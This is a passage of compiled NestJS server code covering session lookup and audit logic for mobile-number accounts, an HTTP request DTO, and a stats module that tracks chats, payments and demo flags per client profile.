                error: error.message || 'Unexpected error',
                retryable: false
            };
        }
    }
    async tryAuditSessions(mobile, options) {
        try {
            const auditSessions = await this.sessionAuditService.getSessionsFormobile(mobile, true);
            if (!auditSessions || auditSessions.length === 0) {
                return { success: false, error: 'No audit sessions found', retryable: false };
            }
            for (let i = 0; i < Math.min(auditSessions.length, 2); i++) {
                const auditSession = auditSessions[i];
                try {
                    const result = await this.sessionManager.createSession({
                        ...options,
                        oldSession: auditSession.sessionString,
                        maxRetries: 1
                    });
                    if (result.success) {
                        return result;
                    }
                }
                catch (error) {
                    this.logger.error(mobile, `Audit session ${i + 1} failed`, error);
                }
            }
            return { success: false, error: 'All audit sessions failed', retryable: false };
        }
        catch (error) {
            return { success: false, error: 'Failed to process audit sessions', retryable: false };
        }
    }
    async updateAuditOnSuccess(mobile, sessionString, creationMethod) {
        try {
            await this.sessionAuditService.createAuditRecord({
                mobile,
                sessionString,
                creationMethod,
                creationMessage: 'Session created successfully'
            });
        }
        catch (error) {
            this.logger.error(mobile, 'Failed to create new audit record on success', error);
        }
    }
    async getSessionAuditHistory(mobile, options) {
        try {
            const result = await this.sessionAuditService.querySessionAudits({
                mobile,
                limit: options?.limit,
                offset: options?.offset,
                status: options?.status
            });
            return { success: true, data: result.sessions, total: result.total };
        }
        catch (error) {
            return { success: false, error: error.message || 'Failed to get audit history' };
        }
    }
    async getActiveSession(mobile) {
        try {
            const activeSession = await this.sessionAuditService.getLatestActiveSession(mobile);
            return { success: true, session: activeSession || undefined };
        }
        catch (error) {
            return { success: false, error: error.message || 'Failed to get active session' };
        }
    }
    async updateSessionLastUsed(mobile, sessionString) {
        try {
            const result = await this.sessionAuditService.markSessionUsed(mobile, sessionString);
            if (result) {
                this.logger.info(mobile, 'Session last used timestamp updated');
                return { success: true };
            }
            else {
                return { success: false, error: 'No active session found to update' };
            }
        }
        catch (error) {
            return { success: false, error: error.message || 'Failed to update session last used timestamp' };
        }
    }
    async findRecentValidSession(mobile) {
        try {
            if (!mobile || typeof mobile !== 'string') {
                return { success: false, error: 'Invalid mobile number provided' };
            }
            const recentSessions = await this.sessionAuditService.findRecentSessions(mobile);
            this.logger.debug(mobile, `Found ${recentSessions?.length || 0} recent sessions for this month`);
            if (!recentSessions || recentSessions.length === 0) {
                this.logger.debug(mobile, 'No recent sessions found for this month');
                return { success: false, error: 'No recent sessions found for this month' };
            }
            for (const session of recentSessions) {
                if (session && session.sessionString) {
                    return { success: true, session };
                }
            }
            this.logger.debug(mobile, 'No valid session found from this month');
            return { success: false, error: 'No valid session found from this month' };
        }
        catch (error) {
            this.logger.error(mobile, 'Failed to find valid session from this month', error);
            return { success: false, error: error.message || 'Failed to find valid session from this month' };
        }
    }
    async getOldestSessionOrCreate(options) {
        const { mobile, allowFallback = true, maxAgeDays = 180 } = options;
        try {
            if (!mobile || typeof mobile !== 'string' || mobile.trim().length === 0) {
                return {
                    success: false,
                    message: 'Mobile number is required and must be a valid non-empty string',
                    code: 'INVALID_MOBILE'
                };
            }
            if (maxAgeDays <= 0 || maxAgeDays > 365) {
                return {
                    success: false,
                    message: 'maxAgeDays must be between 1 and 365 days',
                    code: 'INVALID_MAX_AGE'
                };
            }
            this.logger.info(mobile, `Starting getOldestSessionOrCreate with maxAge: ${maxAgeDays} days, fallback: ${allowFallback}`);
            const rateLimitCheck = this.checkRateLimit(mobile);
            if (!rateLimitCheck.allowed) {
                const resetTime = new Date(rateLimitCheck.resetTime || 0);
                return {
                    success: false,
                    message: `Rate limit exceeded. Maximum ${this.MAX_SESSIONS_PER_HOUR} requests per hour. Try again after ${resetTime.toISOString()}`,
                    code: 'RATE_LIMIT_EXCEEDED',
                    retryable: true
                };
            }
            const oldestSessionResult = await this.findOldestValidSession(mobile, maxAgeDays);
            if (oldestSessionResult.success && oldestSessionResult.session) {
                this.logger.info(mobile, 'Oldest valid session found, updating usage and returning');
                try {
                    await this.sessionAuditService.markSessionUsed(mobile, oldestSessionResult.session.sessionString);
                }
                catch (updateError) {
                    this.logger.error(mobile, 'Warning: Failed to update session usage', updateError);
                }
                const sessionAge = this.calculateSessionAge(oldestSessionResult.session.createdAt);
                return {
                    success: true,
                    message: 'Oldest valid session retrieved successfully',
                    data: {
                        session: oldestSessionResult.session.sessionString,
                        sessionAge,
                        isNew: false,
                        usageCount: oldestSessionResult.session.usageCount,
                        lastUsedAt: oldestSessionResult.session.lastUsedAt.toISOString(),
                        createdAt: oldestSessionResult.session.createdAt.toISOString()
                    }
                };
            }
            if (!allowFallback) {
                this.logger.info(mobile, 'No valid session found and fallback is disabled');
                return {
                    success: false,
                    message: `No valid session found within ${maxAgeDays} days and fallback creation is disabled`,
                    code: 'FALLBACK_DISABLED'
                };
            }
            this.logger.info(mobile, 'No valid session found, creating new session as fallback');
            const createResult = await this.createSessionWithFallback(mobile);
            if (createResult.success && createResult.session) {
                return {
                    success: true,
                    message: 'No existing session found, new session created as fallback',
                    data: {
                        session: createResult.session,
                        sessionAge: 0,
                        isNew: true,
                        usageCount: 0,
                        lastUsedAt: new Date().toISOString(),
                        createdAt: new Date().toISOString()
                    }
                };
            }
            else {
                this.logger.error(mobile, 'Failed to create fallback session', createResult.error);
                return {
                    success: false,
                    message: `Failed to create fallback session: ${createResult.error}`,
                    code: 'FALLBACK_CREATION_FAILED',
                    retryable: createResult.retryable || false
                };
            }
        }
        catch (error) {
            this.logger.error(mobile, 'Unexpected error in getOldestSessionOrCreate', error);
            return {
                success: false,
                message: 'An unexpected error occurred while processing the request',
                code: 'INTERNAL_ERROR',
                retryable: false
            };
        }
    }
    async findOldestValidSession(mobile, maxAgeDays) {
        try {
            const cutoffDate = new Date();
            cutoffDate.setDate(cutoffDate.getDate() - maxAgeDays);
            this.logger.info(mobile, `Searching for sessions newer than ${cutoffDate.toISOString()}`);
            const sessions = await this.sessionAuditService.querySessionAudits({
                mobile,
                isActive: true,
                startDate: cutoffDate,
                limit: 50,
                offset: 0
            });
            if (!sessions.sessions || sessions.sessions.length === 0) {
                this.logger.info(mobile, 'No sessions found within the specified age limit');
                return { success: false, error: 'No sessions found within age limit' };
            }
            const validSessions = sessions.sessions
                .filter(session => session &&
                session.sessionString &&
                typeof session.sessionString === 'string' &&
                session.sessionString.trim().length > 0 &&
                session.isActive === true &&
                (session.status === sessions_schema_1.SessionStatus.ACTIVE || session.status === sessions_schema_1.SessionStatus.CREATED))
                .sort((a, b) => new Date(a.createdAt).getTime() - new Date(b.createdAt).getTime());
            if (validSessions.length === 0) {
                this.logger.info(mobile, 'No valid sessions found (all sessions are invalid or empty)');
                return { success: false, error: 'No valid sessions found' };
            }
            const oldestSession = validSessions[0];
            this.logger.info(mobile, `Found oldest valid session created at ${oldestSession.createdAt}`);
            return { success: true, session: oldestSession };
        }
        catch (error) {
            this.logger.error(mobile, 'Error finding oldest valid session', error);
            return { success: false, error: error.message || 'Failed to find oldest valid session' };
        }
    }
    async createSessionWithFallback(mobile) {
        try {
            return await this.createSession({ mobile });
        }
        catch (error) {
            this.logger.error(mobile, 'Error in createSessionWithFallback', error);
            return {
                success: false,
                error: error.message || 'Failed to create session',
                retryable: false
            };
        }
    }
    calculateSessionAge(createdAt) {
        const now = new Date();
        const sessionDate = new Date(createdAt);
        const diffTime = Math.abs(now.getTime() - sessionDate.getTime());
        const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
        return diffDays;
    }
};
exports.SessionService = SessionService;
exports.SessionService = SessionService = __decorate([
    (0, common_1.Injectable)(),
    __metadata("design:paramtypes", [session_audit_service_1.SessionAuditService])
], SessionService);


/***/ }),

/***/ "./src/components/shared/client-helper.utils.ts":
/*!******************************************************!*\
  !*** ./src/components/shared/client-helper.utils.ts ***!
  \******************************************************/
/***/ ((__unused_webpack_module, exports) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientHelperUtils = void 0;
class ClientHelperUtils {
    static getTimestamp(date) {
        if (!date)
            return 0;
        try {
            return new Date(date).getTime();
        }
        catch {
            return 0;
        }
    }
    static getTodayDateString() {
        return new Date().toISOString().split('T')[0];
    }
    static getDateStringDaysAgo(days, oneDayMs) {
        return new Date(Date.now() - days * oneDayMs).toISOString().split('T')[0];
    }
    static createBackfillTimestamps(now, oneDayMs) {
        return {
            privacyUpdatedAt: new Date(now - (25 * oneDayMs)),
            profilePicsDeletedAt: new Date(now - (20 * oneDayMs)),
            nameBioUpdatedAt: new Date(now - (14 * oneDayMs)),
            usernameUpdatedAt: new Date(now - (10 * oneDayMs)),
            profilePicsUpdatedAt: new Date(now - (7 * oneDayMs)),
        };
    }
}
exports.ClientHelperUtils = ClientHelperUtils;


/***/ }),

/***/ "./src/components/shared/dto/execute-request.dto.ts":
/*!**********************************************************!*\
  !*** ./src/components/shared/dto/execute-request.dto.ts ***!
  \**********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ExecuteRequestDto = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
var ResponseType;
(function (ResponseType) {
    ResponseType["JSON"] = "json";
    ResponseType["TEXT"] = "text";
    ResponseType["STREAM"] = "stream";
    ResponseType["BLOB"] = "blob";
    ResponseType["DOCUMENT"] = "document";
    ResponseType["ARRAYBUFFER"] = "arraybuffer";
})(ResponseType || (ResponseType = {}));
class ExecuteRequestDto {
}
exports.ExecuteRequestDto = ExecuteRequestDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'The URL to send the request to' }),
    (0, class_validator_1.IsUrl)({}, { message: 'Please provide a valid URL' }),
    __metadata("design:type", String)
], ExecuteRequestDto.prototype, "url", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ enum: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'], default: 'GET' }),
    (0, class_validator_1.IsEnum)(['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], ExecuteRequestDto.prototype, "method", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ type: Object, additionalProperties: { type: "string" } }),
    (0, class_validator_1.IsObject)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Object)
], ExecuteRequestDto.prototype, "headers", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Request body data' }),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Object)
], ExecuteRequestDto.prototype, "data", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ type: Object, additionalProperties: { type: 'string' } }),
    (0, class_validator_1.IsObject)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Object)
], ExecuteRequestDto.prototype, "params", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ enum: ResponseType, default: ResponseType.JSON }),
    (0, class_validator_1.IsEnum)(ResponseType),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], ExecuteRequestDto.prototype, "responseType", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Request timeout in milliseconds', default: 30000, minimum: 1000, maximum: 300000 }),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.Min)(1000),
    (0, class_validator_1.Max)(300000),
    (0, class_validator_1.IsOptional)(),
    (0, class_transformer_1.Transform)(({ value }) => parseInt(value)),
    __metadata("design:type", Number)
], ExecuteRequestDto.prototype, "timeout", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Whether to follow redirects', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_transformer_1.Transform)(({ value }) => value === 'true' || value === true),
    __metadata("design:type", Boolean)
], ExecuteRequestDto.prototype, "followRedirects", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Maximum number of redirects to follow', default: 5, minimum: 0, maximum: 10 }),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.Min)(0),
    (0, class_validator_1.Max)(10),
    (0, class_validator_1.IsOptional)(),
    (0, class_transformer_1.Transform)(({ value }) => parseInt(value)),
    __metadata("design:type", Number)
], ExecuteRequestDto.prototype, "maxRedirects", void 0);


/***/ }),

/***/ "./src/components/shared/index.ts":
/*!****************************************!*\
  !*** ./src/components/shared/index.ts ***!
  \****************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./dto/execute-request.dto */ "./src/components/shared/dto/execute-request.dto.ts"), exports);


/***/ }),

/***/ "./src/components/stats/create-stat.dto.ts":
/*!*************************************************!*\
  !*** ./src/components/stats/create-stat.dto.ts ***!
  \*************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateStatDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateStatDto {
}
exports.CreateStatDto = CreateStatDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '6785668464', description: 'Chat ID' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 12, description: 'Count' }),
    __metadata("design:type", Number)
], CreateStatDto.prototype, "count", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 50, description: 'Pay Amount' }),
    __metadata("design:type", Number)
], CreateStatDto.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given Today' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "demoGivenToday", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'New User' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "newUser", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Paid Reply' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Amaan Khan', description: 'Name' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Second Show' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: null, description: 'Did Pay' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "didPay", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "client", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Profile' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "profile", void 0);


/***/ }),

/***/ "./src/components/stats/index.ts":
/*!***************************************!*\
  !*** ./src/components/stats/index.ts ***!
  \***************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.Stat1UpdateDto = exports.Stat1Schema = exports.Stat1 = exports.Stat1Service = exports.Stat1Module = exports.Stat1Controller = exports.Stat1CreateDto = void 0;
var create_stat_dto_1 = __webpack_require__(/*! ./create-stat.dto */ "./src/components/stats/create-stat.dto.ts");
Object.defineProperty(exports, "Stat1CreateDto", ({ enumerable: true, get: function () { return create_stat_dto_1.CreateStatDto; } }));
var stat_controller_1 = __webpack_require__(/*! ./stat.controller */ "./src/components/stats/stat.controller.ts");
Object.defineProperty(exports, "Stat1Controller", ({ enumerable: true, get: function () { return stat_controller_1.StatController; } }));
var stat_module_1 = __webpack_require__(/*! ./stat.module */ "./src/components/stats/stat.module.ts");
Object.defineProperty(exports, "Stat1Module", ({ enumerable: true, get: function () { return stat_module_1.StatModule; } }));
var stat_service_1 = __webpack_require__(/*! ./stat.service */ "./src/components/stats/stat.service.ts");
Object.defineProperty(exports, "Stat1Service", ({ enumerable: true, get: function () { return stat_service_1.StatService; } }));
var stat_schema_1 = __webpack_require__(/*! ./stat.schema */ "./src/components/stats/stat.schema.ts");
Object.defineProperty(exports, "Stat1", ({ enumerable: true, get: function () { return stat_schema_1.Stat; } }));
Object.defineProperty(exports, "Stat1Schema", ({ enumerable: true, get: function () { return stat_schema_1.StatSchema; } }));
var update_stat_dto_1 = __webpack_require__(/*! ./update-stat.dto */ "./src/components/stats/update-stat.dto.ts");
Object.defineProperty(exports, "Stat1UpdateDto", ({ enumerable: true, get: function () { return update_stat_dto_1.UpdateStatDto; } }));


/***/ }),

/***/ "./src/components/stats/stat.controller.ts":
/*!*************************************************!*\
  !*** ./src/components/stats/stat.controller.ts ***!
  \*************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.StatController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const stat_service_1 = __webpack_require__(/*! ./stat.service */ "./src/components/stats/stat.service.ts");
const create_stat_dto_1 = __webpack_require__(/*! ./create-stat.dto */ "./src/components/stats/create-stat.dto.ts");
const update_stat_dto_1 = __webpack_require__(/*! ./update-stat.dto */ "./src/components/stats/update-stat.dto.ts");
let StatController = class StatController {
    constructor(statService) {
        this.statService = statService;
    }
    async create(createStatDto) {
        return this.statService.create(createStatDto);
    }
    async findByChatIdAndProfile(chatId, profile) {
        return this.statService.findByChatIdAndProfile(chatId, profile);
    }
    async update(chatId, profile, updateStatDto) {
        return this.statService.update(chatId, profile, updateStatDto);
    }
    async deleteOne(chatId, profile) {
        return this.statService.deleteOne(chatId, profile);
    }
    async deleteAll() {
        return this.statService.deleteAll();
    }
};
exports.StatController = StatController;
__decorate([
    (0, common_1.Post)(),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_stat_dto_1.CreateStatDto]),
    __metadata("design:returntype", Promise)
], StatController.prototype, "create", null);
__decorate([
    (0, common_1.Get)(':chatId/:profile'),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Param)('profile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], StatController.prototype, "findByChatIdAndProfile", null);
__decorate([
    (0, common_1.Put)(':chatId/:profile'),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Param)('profile')),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, update_stat_dto_1.UpdateStatDto]),
    __metadata("design:returntype", Promise)
], StatController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':chatId/:profile'),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Param)('profile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], StatController.prototype, "deleteOne", null);
__decorate([
    (0, common_1.Delete)(),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], StatController.prototype, "deleteAll", null);
exports.StatController = StatController = __decorate([
    (0, swagger_1.ApiTags)('stats'),
    (0, common_1.Controller)('stats'),
    __metadata("design:paramtypes", [stat_service_1.StatService])
], StatController);


/***/ }),

/***/ "./src/components/stats/stat.module.ts":
/*!*********************************************!*\
  !*** ./src/components/stats/stat.module.ts ***!
  \*********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.StatModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const stat_service_1 = __webpack_require__(/*! ./stat.service */ "./src/components/stats/stat.service.ts");
const stat_controller_1 = __webpack_require__(/*! ./stat.controller */ "./src/components/stats/stat.controller.ts");
const stat_schema_1 = __webpack_require__(/*! ./stat.schema */ "./src/components/stats/stat.schema.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
let StatModule = class StatModule {
};
exports.StatModule = StatModule;
exports.StatModule = StatModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: "StatsModule", collection: "stats", schema: stat_schema_1.StatSchema }])
        ],
        controllers: [stat_controller_1.StatController],
        providers: [stat_service_1.StatService],
        exports: [stat_service_1.StatService]
    })
], StatModule);


/***/ }),

/***/ "./src/components/stats/stat.schema.ts":
/*!*********************************************!*\
  !*** ./src/components/stats/stat.schema.ts ***!
  \*********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.StatSchema = exports.Stat = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let Stat = class Stat {
};
exports.Stat = Stat;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '6785668464', description: 'Chat ID' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 12, description: 'Count' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], Stat.prototype, "count", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 50, description: 'Pay Amount' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], Stat.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given Today' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat.prototype, "demoGivenToday", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'New User' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat.prototype, "newUser", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Paid Reply' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Amaan Khan', description: 'Name' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Second Show' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: null, description: 'Did Pay' }),
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", Boolean)
], Stat.prototype, "didPay", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat.prototype, "client", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Profile' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat.prototype, "profile", void 0);
exports.Stat = Stat = __decorate([
    (0, mongoose_1.Schema)()
], Stat);
exports.StatSchema = mongoose_1.SchemaFactory.createForClass(Stat);
exports.StatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });


/***/ }),

/***/ "./src/components/stats/stat.service.ts":
/*!**********************************************!*\
  !*** ./src/components/stats/stat.service.ts ***!
  \**********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.StatService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
let StatService = class StatService {
    constructor(statModel) {
        this.statModel = statModel;
    }
    async create(createStatDto) {
        const createdStat = new this.statModel(createStatDto);
        return createdStat.save();
    }
    async findAll() {
        const stats = await this.statModel.find().exec();
        return stats;
    }
    async findByChatIdAndProfile(chatId, profile) {
        const stat = await this.statModel.findOne({ chatId, profile }).exec();
        if (!stat) {
            throw new common_1.NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);
        }
        return stat;
    }
    async update(chatId, profile, updateStatDto) {
        const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();
        if (!stat) {
